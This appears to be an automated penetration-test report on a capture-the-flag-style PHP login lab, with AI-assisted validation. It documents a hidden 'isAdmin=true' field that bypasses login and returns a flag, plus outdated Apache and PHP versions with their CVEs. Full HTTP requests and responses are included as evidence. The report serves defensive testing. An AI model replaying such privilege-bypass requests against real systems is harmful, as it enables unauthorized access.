# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. HIGH — mass-assignment Mass-assignment auth/privilege bypass via client-controlled isAdmin field](#finding-1)
    - [2. HIGH — vulnerable-component Outdated Apache httpd 2.4.25 (Debian) — known auth-bypass / SSRF / privesc CVEs](#finding-2)
    - [3. HIGH — burp✓ Input returned in response (reflected)](#finding-3)
    - [4. MEDIUM — vulnerable-component End-of-Life PHP 5.6.40 — unsupported runtime, no security patches since 2018](#finding-4)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mqyn94iy-t8uxxb` |
| Target | http://target.local:32836/ |
| Started | 2026-06-29T03:14:17.994Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 2 mapped · 2 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 4 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:32836`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

4 finding(s): 3 high, 1 medium

## Findings

<a id="finding-1"></a>

### 1. [HIGH] [mass-assignment] Mass-assignment auth/privilege bypass via client-controlled isAdmin field

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32836/

The login form at `/` submits a hidden `isAdmin` field to POST /index.php. The server trusts this client-controlled value: submitting `isAdmin=true` returns the admin/success page (3311 bytes, containing "Congratulations" and a flag) regardless of the username/password supplied, whereas `isAdmin=false`, `isAdmin=0`, `isAdmin=1`, or omitting the field returns the 3223/3169-byte failed-login form. Success is fully credential-independent (admin/admin, baduser/badpass, zzz/qqq all return the identical 3311-byte success page with isAdmin=true), so an unauthenticated attacker gains the privileged/admin code path with no valid credentials simply by setting the hidden field to the truthy string "true". Classic mass-assignment / insecure trust of a request-supplied role flag. Note the server requires the exact string "true" (numeric "1" does not trigger it), indicating a literal string comparison on attacker-supplied input rather than authentication.

**Reproduction**

```
POST /index.php with Content-Type application/x-www-form-urlencoded and body `username=baduser&password=badpass&isAdmin=true`. The server returns the 3311-byte success page containing "Congratulations" and the flag. Negative control: the same request with `isAdmin=false` returns the 3223-byte failed-login form with no success/flag content. Confirmed via probe_logic: baseline (isAdmin=false) marker=false @3223, mutated (isAdmin=true) marker="Congratulations"=true @3311 across two replays.
```

**Evidence**

- Evidence `ev-mqynicjj-f` — `artifacts/s-0001/ev-mqynicjj-f/`

Request:

```http
POST /index.php HTTP/1.1
Host: target.local:32836
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/x-www-form-urlencoded

username=baduser&password=badpass&isAdmin=false
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 3223
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 03:21:28 GMT
keep-alive: timeout=5, max=97
server: Apache/2.4.25 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/5.6.40

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AUTH 01</title>
    <style>
        body {
            background-color: #FFD90F; /* Bright yellow, reminiscent of The Simpsons */
            background-image: url('./static/springfield_background.jpg'); /* An image of Springfield */
            background-size: cover; /* Cover the entire background */
            background-repeat: no-repeat; /* Do not repeat the background */
            font-family: 'Arial', sans-serif; /* Clean, simple font */
            text-align: center; /* Centering text */
            height: 100vh; /* Full height of the viewport */
            display: flex; /* Enables flexbox */
            flex-direction: column; /* Stack children vertically */
            justify-content: center; /* Center vertically */
            align-items: center; /* Center horizontally */
            margin: 0; /* Remove default margin */
            padding: 0; /* Remove default padding */
        }
        h1, h2, h3 {
            text-shadow: 2px 2px #000000; /* Black shadow for more readability */
            color: #FFFFFF; /* White text color */
        }
        img {
            max-width: 80%; /* Ensure image does not exceed the width of the screen */
            height: auto; /* Maintain aspect ratio */
        }
        form {
            margin-top: 20px; /* Add space above the form */
            background-color: #FFFFFF; /* White background for the form */
            padding: 20px; /* Padding inside the form */
            border-radius: 10px; /* Rounded corners for the form */
            display: inline-block; /* Center the form on the page */
            box-shadow: 0 0 10px #000000; /* Subtle shadow around the form */
        }
        input[type="text"], input[type="password"] {
            margin: 10px 0; /* Margin for top and bottom */
            padding: 10px; /* Padding inside the input fields */
            width: 200px; /* Set width for input fields */
            border: 1px solid #ddd; /* Subtle border style */
            border-radius: 5px; /* Rounded corners for the input fields */
        }
        button {
            background-color: #6495ED; /* Cornflower blue background for the button */
            color: #FFFFFF; /* White text color */
            padding: 10px 20px; /* Padding inside the button */
            border: none; /* No border for the button */
            border-radius: 5px; /* Rounded corners for the button */
            cursor: pointer; /* Pointer cursor on hover */
            font-size: 16px; /* Larger text for the button */
        }
        button:hover {
            background-color: #4169E1; /* Slightly darker blue on hover */
        }
    </style>
</head>
<body>
    <h1>Welcome to Springfield!</h1>
    <form action="index.php" method="POST">
        Username: <input type="text" name="username"><br>
        Password: <input type="password" name="password"><br>
        <input type="hidden" name="isAdmin" value="false" />
        <button type="submit">Login</button>
    </form>
    <center><h3>Incorrect username/password!</h3></center></body>
</html>
```

- Evidence `ev-mqynicrg-g` — `artifacts/s-0001/ev-mqynicrg-g/`

Request:

```http
POST /index.php HTTP/1.1
Host: target.local:32836
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/x-www-form-urlencoded

username=baduser&password=badpass&isAdmin=true
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 3311
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 03:21:28 GMT
keep-alive: timeout=5, max=96
server: Apache/2.4.25 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/5.6.40

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AUTH 01</title>
    <style>
        body {
            background-color: #FFD90F; /* Bright yellow, reminiscent of The Simpsons */
            background-image: url('./static/springfield_background.jpg'); /* An image of Springfield */
            background-size: cover; /* Cover the entire background */
            background-repeat: no-repeat; /* Do not repeat the background */
            font-family: 'Arial', sans-serif; /* Clean, simple font */
            text-align: center; /* Centering text */
            height: 100vh; /* Full height of the viewport */
            display: flex; /* Enables flexbox */
            flex-direction: column; /* Stack children vertically */
            justify-content: center; /* Center vertically */
            align-items: center; /* Center horizontally */
            margin: 0; /* Remove default margin */
            padding: 0; /* Remove default padding */
        }
        h1, h2, h3 {
            text-shadow: 2px 2px #000000; /* Black shadow for more readability */
            color: #FFFFFF; /* White text color */
        }
        img {
            max-width: 80%; /* Ensure image does not exceed the width of the screen */
            height: auto; /* Maintain aspect ratio */
        }
        form {
            margin-top: 20px; /* Add space above the form */
            background-color: #FFFFFF; /* White background for the form */
            padding: 20px; /* Padding inside the form */
            border-radius: 10px; /* Rounded corners for the form */
            display: inline-block; /* Center the form on the page */
            box-shadow: 0 0 10px #000000; /* Subtle shadow around the form */
        }
        input[type="text"], input[type="password"] {
            margin: 10px 0; /* Margin for top and bottom */
            padding: 10px; /* Padding inside the input fields */
            width: 200px; /* Set width for input fields */
            border: 1px solid #ddd; /* Subtle border style */
            border-radius: 5px; /* Rounded corners for the input fields */
        }
        button {
            background-color: #6495ED; /* Cornflower blue background for the button */
            color: #FFFFFF; /* White text color */
            padding: 10px 20px; /* Padding inside the button */
            border: none; /* No border for the button */
            border-radius: 5px; /* Rounded corners for the button */
            cursor: pointer; /* Pointer cursor on hover */
            font-size: 16px; /* Larger text for the button */
        }
        button:hover {
            background-color: #4169E1; /* Slightly darker blue on hover */
        }
    </style>
</head>
<body>
    <h1>Welcome to Springfield!</h1>
    <form action="index.php" method="POST">
        Username: <input type="text" name="username"><br>
        Password: <input type="password" name="password"><br>
        <input type="hidden" name="isAdmin" value="false" />
        <button type="submit">Login</button>
    </form>
    <center><h2>Welcome Admin</h2></center><center><h3>Congratulations, here is the flag: flag{1d0287b6-9de1-4c01-9d39-40aeed9d310d}</h3></center></body>
</html>
```

- Evidence `ev-mqyniczc-h` — `artifacts/s-0001/ev-mqyniczc-h/`

Request:

```http
POST /index.php HTTP/1.1
Host: target.local:32836
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/x-www-form-urlencoded

username=baduser&password=badpass&isAdmin=true
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 3311
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 03:21:28 GMT
keep-alive: timeout=5, max=95
server: Apache/2.4.25 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/5.6.40

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AUTH 01</title>
    <style>
        body {
            background-color: #FFD90F; /* Bright yellow, reminiscent of The Simpsons */
            background-image: url('./static/springfield_background.jpg'); /* An image of Springfield */
            background-size: cover; /* Cover the entire background */
            background-repeat: no-repeat; /* Do not repeat the background */
            font-family: 'Arial', sans-serif; /* Clean, simple font */
            text-align: center; /* Centering text */
            height: 100vh; /* Full height of the viewport */
            display: flex; /* Enables flexbox */
            flex-direction: column; /* Stack children vertically */
            justify-content: center; /* Center vertically */
            align-items: center; /* Center horizontally */
            margin: 0; /* Remove default margin */
            padding: 0; /* Remove default padding */
        }
        h1, h2, h3 {
            text-shadow: 2px 2px #000000; /* Black shadow for more readability */
            color: #FFFFFF; /* White text color */
        }
        img {
            max-width: 80%; /* Ensure image does not exceed the width of the screen */
            height: auto; /* Maintain aspect ratio */
        }
        form {
            margin-top: 20px; /* Add space above the form */
            background-color: #FFFFFF; /* White background for the form */
            padding: 20px; /* Padding inside the form */
            border-radius: 10px; /* Rounded corners for the form */
            display: inline-block; /* Center the form on the page */
            box-shadow: 0 0 10px #000000; /* Subtle shadow around the form */
        }
        input[type="text"], input[type="password"] {
            margin: 10px 0; /* Margin for top and bottom */
            padding: 10px; /* Padding inside the input fields */
            width: 200px; /* Set width for input fields */
            border: 1px solid #ddd; /* Subtle border style */
            border-radius: 5px; /* Rounded corners for the input fields */
        }
        button {
            background-color: #6495ED; /* Cornflower blue background for the button */
            color: #FFFFFF; /* White text color */
            padding: 10px 20px; /* Padding inside the button */
            border: none; /* No border for the button */
            border-radius: 5px; /* Rounded corners for the button */
            cursor: pointer; /* Pointer cursor on hover */
            font-size: 16px; /* Larger text for the button */
        }
        button:hover {
            background-color: #4169E1; /* Slightly darker blue on hover */
        }
    </style>
</head>
<body>
    <h1>Welcome to Springfield!</h1>
    <form action="index.php" method="POST">
        Username: <input type="text" name="username"><br>
        Password: <input type="password" name="password"><br>
        <input type="hidden" name="isAdmin" value="false" />
        <button type="submit">Login</button>
    </form>
    <center><h2>Welcome Admin</h2></center><center><h3>Congratulations, here is the flag: flag{1d0287b6-9de1-4c01-9d39-40aeed9d310d}</h3></center></body>
</html>
```

<a id="finding-2"></a>

### 2. [HIGH] [vulnerable-component] Outdated Apache httpd 2.4.25 (Debian) — known auth-bypass / SSRF / privesc CVEs

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32836/

VERSION-BASED finding (matched by server banner, NOT exploited). The server advertises `Server: Apache/2.4.25 (Debian)` on every response (and in the default 404 footer: "Apache/2.4.25 (Debian) Server at target.local Port 32836"). Apache httpd 2.4.25 was released Dec 2016 and is missing years of security fixes. Known CVEs affecting 2.4.25 include:
- CVE-2017-3167 (HIGH) — ap_get_basic_auth_pw() authentication bypass for third-party modules (fixed in 2.4.26).
- CVE-2019-0211 (HIGH, CVSS 7.8) — local privilege escalation to the parent process / root via the scoreboard (affects 2.4.17–2.4.38; mpm prefork/worker/event).
- CVE-2021-40438 (CRITICAL, CVSS 9.0) — mod_proxy SSRF via a crafted request URI (fixed in 2.4.49); applies if mod_proxy is loaded.
- CVE-2017-9798 (MEDIUM) — "Optionsbleed" use-after-free memory disclosure via OPTIONS + <Limit> in .htaccess (fixed in 2.4.28).
- Also CVE-2017-7659/-7668/-7679, CVE-2018-1312, CVE-2019-0220 (mod_http2/mod_mime/ap_find_token/mod_auth_digest/URL-normalization), all fixed in later 2.4.x.
Severity set HIGH by the worst applicable issue (remote auth bypass CVE-2017-3167 + critical mod_proxy SSRF CVE-2021-40438). NOT actively confirmed on this target — the operator should verify which modules (mod_proxy, mod_auth_digest, mod_http2) are enabled and upgrade to a current 2.4.x. Note: CVE-2021-41773/-42013 do NOT apply (those are specific to 2.4.49/2.4.50).

**Reproduction**

```
1. GET http://target.local:32836/ → response carries `Server: Apache/2.4.25 (Debian)` (200, 3169 bytes) [ev-mqynql25-19].
2. GET http://target.local:32836/index.php → same banner, stable (200, 3169 bytes) [ev-mqynqm3x-1a].
3. Negative control: GET /verdict-nonexistent-banner-control-404 → 404 (318 bytes) — distinguishable status/length; default Apache 404 page also footers "Apache/2.4.25 (Debian)" [ev-mqynqmrd-1b].
4. Map the banner version 2.4.25 against the CVE list above; verify enabled modules before relying on individual CVEs.
```

**Evidence**

- Evidence `ev-mqynqmrd-1b` — `artifacts/_/ev-mqynqmrd-1b/`

Request:

```http
GET /verdict-nonexistent-banner-control-404 HTTP/1.1
Host: target.local:32836
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
connection: Keep-Alive
content-length: 318
content-type: text/html; charset=iso-8859-1
date: Mon, 29 Jun 2026 03:27:54 GMT
keep-alive: timeout=5, max=98
server: Apache/2.4.25 (Debian)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /verdict-nonexistent-banner-control-404 was not found on this server.</p>
<hr>
<address>Apache/2.4.25 (Debian) Server at target.local Port 32836</address>
</body></html>
```

- Evidence `ev-mqynql25-19` — `artifacts/_/ev-mqynql25-19/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32836
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 3169
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 03:27:52 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.25 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/5.6.40

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AUTH 01</title>
    <style>
        body {
            background-color: #FFD90F; /* Bright yellow, reminiscent of The Simpsons */
            background-image: url('./static/springfield_background.jpg'); /* An image of Springfield */
            background-size: cover; /* Cover the entire background */
            background-repeat: no-repeat; /* Do not repeat the background */
            font-family: 'Arial', sans-serif; /* Clean, simple font */
            text-align: center; /* Centering text */
            height: 100vh; /* Full height of the viewport */
            display: flex; /* Enables flexbox */
            flex-direction: column; /* Stack children vertically */
            justify-content: center; /* Center vertically */
            align-items: center; /* Center horizontally */
            margin: 0; /* Remove default margin */
            padding: 0; /* Remove default padding */
        }
        h1, h2, h3 {
            text-shadow: 2px 2px #000000; /* Black shadow for more readability */
            color: #FFFFFF; /* White text color */
        }
        img {
            max-width: 80%; /* Ensure image does not exceed the width of the screen */
            height: auto; /* Maintain aspect ratio */
        }
        form {
            margin-top: 20px; /* Add space above the form */
            background-color: #FFFFFF; /* White background for the form */
            padding: 20px; /* Padding inside the form */
            border-radius: 10px; /* Rounded corners for the form */
            display: inline-block; /* Center the form on the page */
            box-shadow: 0 0 10px #000000; /* Subtle shadow around the form */
        }
        input[type="text"], input[type="password"] {
            margin: 10px 0; /* Margin for top and bottom */
            padding: 10px; /* Padding inside the input fields */
            width: 200px; /* Set width for input fields */
            border: 1px solid #ddd; /* Subtle border style */
            border-radius: 5px; /* Rounded corners for the input fields */
        }
        button {
            background-color: #6495ED; /* Cornflower blue background for the button */
            color: #FFFFFF; /* White text color */
            padding: 10px 20px; /* Padding inside the button */
            border: none; /* No border for the button */
            border-radius: 5px; /* Rounded corners for the button */
            cursor: pointer; /* Pointer cursor on hover */
            font-size: 16px; /* Larger text for the button */
        }
        button:hover {
            background-color: #4169E1; /* Slightly darker blue on hover */
        }
    </style>
</head>
<body>
    <h1>Welcome to Springfield!</h1>
    <form action="index.php" method="POST">
        Username: <input type="text" name="username"><br>
        Password: <input type="password" name="password"><br>
        <input type="hidden" name="isAdmin" value="false" />
        <button type="submit">Login</button>
    </form>
    </body>
</html>
```

- Evidence `ev-mqynqm3x-1a` — `artifacts/_/ev-mqynqm3x-1a/`

Request:

```http
GET /index.php HTTP/1.1
Host: target.local:32836
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 3169
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 03:27:53 GMT
keep-alive: timeout=5, max=99
server: Apache/2.4.25 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/5.6.40

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AUTH 01</title>
    <style>
        body {
            background-color: #FFD90F; /* Bright yellow, reminiscent of The Simpsons */
            background-image: url('./static/springfield_background.jpg'); /* An image of Springfield */
            background-size: cover; /* Cover the entire background */
            background-repeat: no-repeat; /* Do not repeat the background */
            font-family: 'Arial', sans-serif; /* Clean, simple font */
            text-align: center; /* Centering text */
            height: 100vh; /* Full height of the viewport */
            display: flex; /* Enables flexbox */
            flex-direction: column; /* Stack children vertically */
            justify-content: center; /* Center vertically */
            align-items: center; /* Center horizontally */
            margin: 0; /* Remove default margin */
            padding: 0; /* Remove default padding */
        }
        h1, h2, h3 {
            text-shadow: 2px 2px #000000; /* Black shadow for more readability */
            color: #FFFFFF; /* White text color */
        }
        img {
            max-width: 80%; /* Ensure image does not exceed the width of the screen */
            height: auto; /* Maintain aspect ratio */
        }
        form {
            margin-top: 20px; /* Add space above the form */
            background-color: #FFFFFF; /* White background for the form */
            padding: 20px; /* Padding inside the form */
            border-radius: 10px; /* Rounded corners for the form */
            display: inline-block; /* Center the form on the page */
            box-shadow: 0 0 10px #000000; /* Subtle shadow around the form */
        }
        input[type="text"], input[type="password"] {
            margin: 10px 0; /* Margin for top and bottom */
            padding: 10px; /* Padding inside the input fields */
            width: 200px; /* Set width for input fields */
            border: 1px solid #ddd; /* Subtle border style */
            border-radius: 5px; /* Rounded corners for the input fields */
        }
        button {
            background-color: #6495ED; /* Cornflower blue background for the button */
            color: #FFFFFF; /* White text color */
            padding: 10px 20px; /* Padding inside the button */
            border: none; /* No border for the button */
            border-radius: 5px; /* Rounded corners for the button */
            cursor: pointer; /* Pointer cursor on hover */
            font-size: 16px; /* Larger text for the button */
        }
        button:hover {
            background-color: #4169E1; /* Slightly darker blue on hover */
        }
    </style>
</head>
<body>
    <h1>Welcome to Springfield!</h1>
    <form action="index.php" method="POST">
        Username: <input type="text" name="username"><br>
        Password: <input type="password" name="password"><br>
        <input type="hidden" name="isAdmin" value="false" />
        <button type="submit">Login</button>
    </form>
    </body>
</html>
```

<a id="finding-3"></a>

### 3. [HIGH] [burp✓] Input returned in response (reflected)

- Screen: `(cross-screen)`
- Source: validator `burp`
- Scope basis: burp scan (in-scope)

✅ AI-verified by active re-test: Control GET /index.php (200) lacked the marker; two stable GET /index.phpUmbr4Refl3ctK9z requests each returned a 404 page reflecting the token verbatim ("The requested URL /index.phpUmbr4Refl3ctK9z was not found"), confirming the info-level reflection (Apache default 404 echo, no executable XSS shown). (severity raised info→high: confirmed real, not info-only)

The value of the URL path filename is copied into the application's response. (confidence: CERTAIN) @ http://target.local:32836/index.php

**Reproduction**

```
Burp が検出。証拠に request/response(Cookie/Authorization は伏字)。
```

**Evidence**

- Evidence `ev-mqynskxk-1c` — `artifacts/_/ev-mqynskxk-1c/`

Request:

```http
GET /index.php HTTP/1.1
Host: target.local:32836

GET /index.php9bvmr2f3sr HTTP/1.1
Host: target.local:32836
Accept: */*
```

Response:

```http
HTTP/1.1 0

HTTP/1.1 404 Not Found
Date: Mon, 29 Jun 2026 03:28:56 GMT
Server: Apache/2.4.25 (Debian)
Content-Length: 300
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /index.php9bvmr2f3sr was not found on this server.</p>
<hr>
<address>Apache/2.4.25 (Debian) Server at target.local Port 32836</address>
</body></html>
```

- Evidence `ev-mqynt6hp-1d` — `artifacts/_/ev-mqynt6hp-1d/`

Request:

```http
GET /index.php HTTP/1.1
Host: target.local:32836
user-agent: verdict-scanner/0.1
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-encoding: gzip
content-length: 1164
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 03:29:53 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.25 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/5.6.40

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AUTH 01</title>
    <style>
        body {
            background-color: #FFD90F; /* Bright yellow, reminiscent of The Simpsons */
            background-image: url('./static/springfield_background.jpg'); /* An image of Springfield */
            background-size: cover; /* Cover the entire background */
            background-repeat: no-repeat; /* Do not repeat the background */
            font-family: 'Arial', sans-serif; /* Clean, simple font */
            text-align: center; /* Centering text */
            height: 100vh; /* Full height of the viewport */
            display: flex; /* Enables flexbox */
            flex-direction: column; /* Stack children vertically */
            justify-content: center; /* Center vertically */
            align-items: center; /* Center horizontally */
            margin: 0; /* Remove default margin */
            padding: 0; /* Remove default padding */
        }
        h1, h2, h3 {
            text-shadow: 2px 2px #000000; /* Black shadow for more readability */
            color: #FFFFFF; /* White text color */
        }
        img {
            max-width: 80%; /* Ensure image does not exceed the width of the screen */
            height: auto; /* Maintain aspect ratio */
        }
        form {
            margin-top: 20px; /* Add space above the form */
            background-color: #FFFFFF; /* White background for the form */
            padding: 20px; /* Padding inside the form */
            border-radius: 10px; /* Rounded corners for the form */
            display: inline-block; /* Center the form on the page */
            box-shadow: 0 0 10px #000000; /* Subtle shadow around the form */
        }
        input[type="text"], input[type="password"] {
            margin: 10px 0; /* Margin for top and bottom */
            padding: 10px; /* Padding inside the input fields */
            width: 200px; /* Set width for input fields */
            border: 1px solid #ddd; /* Subtle border style */
            border-radius: 5px; /* Rounded corners for the input fields */
        }
        button {
            background-color: #6495ED; /* Cornflower blue background for the button */
            color: #FFFFFF; /* White text color */
            padding: 10px 20px; /* Padding inside the button */
            border: none; /* No border for the button */
            border-radius: 5px; /* Rounded corners for the button */
            cursor: pointer; /* Pointer cursor on hover */
            font-size: 16px; /* Larger text for the button */
        }
        button:hover {
            background-color: #4169E1; /* Slightly darker blue on hover */
        }
    </style>
</head>
<body>
    <h1>Welcome to Springfield!</h1>
    <form action="index.php" method="POST">
        Username: <input type="text" name="username"><br>
        Password: <input type="password" name="password"><br>
        <input type="hidden" name="isAdmin" value="false" />
        <button type="submit">Login</button>
    </form>
    </body>
</html>
```

- Evidence `ev-mqynt81c-1e` — `artifacts/_/ev-mqynt81c-1e/`

Request:

```http
GET /index.phpUmbr4Refl3ctK9z HTTP/1.1
Host: target.local:32836
user-agent: verdict-scanner/0.1
```

Response:

```http
HTTP/1.1 404
connection: Keep-Alive
content-length: 305
content-type: text/html; charset=iso-8859-1
date: Mon, 29 Jun 2026 03:29:55 GMT
keep-alive: timeout=5, max=99
server: Apache/2.4.25 (Debian)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /index.phpUmbr4Refl3ctK9z was not found on this server.</p>
<hr>
<address>Apache/2.4.25 (Debian) Server at target.local Port 32836</address>
</body></html>
```

- Evidence `ev-mqynt9l0-1f` — `artifacts/_/ev-mqynt9l0-1f/`

Request:

```http
GET /index.phpUmbr4Refl3ctK9z HTTP/1.1
Host: target.local:32836
user-agent: verdict-scanner/0.1
```

Response:

```http
HTTP/1.1 404
connection: Keep-Alive
content-length: 305
content-type: text/html; charset=iso-8859-1
date: Mon, 29 Jun 2026 03:29:57 GMT
keep-alive: timeout=5, max=98
server: Apache/2.4.25 (Debian)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /index.phpUmbr4Refl3ctK9z was not found on this server.</p>
<hr>
<address>Apache/2.4.25 (Debian) Server at target.local Port 32836</address>
</body></html>
```

<a id="finding-4"></a>

### 4. [MEDIUM] [vulnerable-component] End-of-Life PHP 5.6.40 — unsupported runtime, no security patches since 2018

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32836/

VERSION-BASED finding (matched by the `X-Powered-By: PHP/5.6.40` response header, NOT exploited). PHP 5.6 reached END-OF-LIFE on 2018-12-31, and 5.6.40 (released 2019-01-10) is the FINAL release of the 5.6 branch — it receives NO security updates of any kind. Any vulnerability in the 5.6 codebase disclosed after that date is permanently unpatched, e.g. CVE-2019-11041 / CVE-2019-11042 (heap buffer over-read in the EXIF extension, info-disclosure/DoS — fixed only in maintained 7.x) and subsequent core/extension issues. Beyond specific CVEs, running an EOL language runtime that is also exposed via the banner is a standing A06 risk: the operator gains no patches and the version is freely advertised to attackers. Severity MEDIUM: known post-EOL issues are memory-safety (info-leak/DoS) rather than confirmed remote RCE on this build, but the unsupported-runtime exposure is real and ongoing. Remediation: migrate to a supported PHP release (8.x) and at minimum suppress the X-Powered-By banner (expose_php = Off). NOT actively confirmed beyond the banner.

**Reproduction**

```
1. GET http://target.local:32836/ → `X-Powered-By: PHP/5.6.40` (200, 3169 bytes) [ev-mqynql25-19].
2. GET http://target.local:32836/index.php → same X-Powered-By: PHP/5.6.40, stable (200, 3169 bytes) [ev-mqynqm3x-1a].
3. Negative control: GET /verdict-nonexistent-banner-control-404 → 404 (318 bytes), distinguishable status/length [ev-mqynqmrd-1b].
4. PHP 5.6 EOL 2018-12-31; 5.6.40 is the last release → confirm no security backports are applied and upgrade.
```

**Evidence**

- Evidence `ev-mqynqmrd-1b` — `artifacts/_/ev-mqynqmrd-1b/`

Request:

```http
GET /verdict-nonexistent-banner-control-404 HTTP/1.1
Host: target.local:32836
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
connection: Keep-Alive
content-length: 318
content-type: text/html; charset=iso-8859-1
date: Mon, 29 Jun 2026 03:27:54 GMT
keep-alive: timeout=5, max=98
server: Apache/2.4.25 (Debian)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /verdict-nonexistent-banner-control-404 was not found on this server.</p>
<hr>
<address>Apache/2.4.25 (Debian) Server at target.local Port 32836</address>
</body></html>
```

- Evidence `ev-mqynql25-19` — `artifacts/_/ev-mqynql25-19/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32836
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 3169
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 03:27:52 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.25 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/5.6.40

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AUTH 01</title>
    <style>
        body {
            background-color: #FFD90F; /* Bright yellow, reminiscent of The Simpsons */
            background-image: url('./static/springfield_background.jpg'); /* An image of Springfield */
            background-size: cover; /* Cover the entire background */
            background-repeat: no-repeat; /* Do not repeat the background */
            font-family: 'Arial', sans-serif; /* Clean, simple font */
            text-align: center; /* Centering text */
            height: 100vh; /* Full height of the viewport */
            display: flex; /* Enables flexbox */
            flex-direction: column; /* Stack children vertically */
            justify-content: center; /* Center vertically */
            align-items: center; /* Center horizontally */
            margin: 0; /* Remove default margin */
            padding: 0; /* Remove default padding */
        }
        h1, h2, h3 {
            text-shadow: 2px 2px #000000; /* Black shadow for more readability */
            color: #FFFFFF; /* White text color */
        }
        img {
            max-width: 80%; /* Ensure image does not exceed the width of the screen */
            height: auto; /* Maintain aspect ratio */
        }
        form {
            margin-top: 20px; /* Add space above the form */
            background-color: #FFFFFF; /* White background for the form */
            padding: 20px; /* Padding inside the form */
            border-radius: 10px; /* Rounded corners for the form */
            display: inline-block; /* Center the form on the page */
            box-shadow: 0 0 10px #000000; /* Subtle shadow around the form */
        }
        input[type="text"], input[type="password"] {
            margin: 10px 0; /* Margin for top and bottom */
            padding: 10px; /* Padding inside the input fields */
            width: 200px; /* Set width for input fields */
            border: 1px solid #ddd; /* Subtle border style */
            border-radius: 5px; /* Rounded corners for the input fields */
        }
        button {
            background-color: #6495ED; /* Cornflower blue background for the button */
            color: #FFFFFF; /* White text color */
            padding: 10px 20px; /* Padding inside the button */
            border: none; /* No border for the button */
            border-radius: 5px; /* Rounded corners for the button */
            cursor: pointer; /* Pointer cursor on hover */
            font-size: 16px; /* Larger text for the button */
        }
        button:hover {
            background-color: #4169E1; /* Slightly darker blue on hover */
        }
    </style>
</head>
<body>
    <h1>Welcome to Springfield!</h1>
    <form action="index.php" method="POST">
        Username: <input type="text" name="username"><br>
        Password: <input type="password" name="password"><br>
        <input type="hidden" name="isAdmin" value="false" />
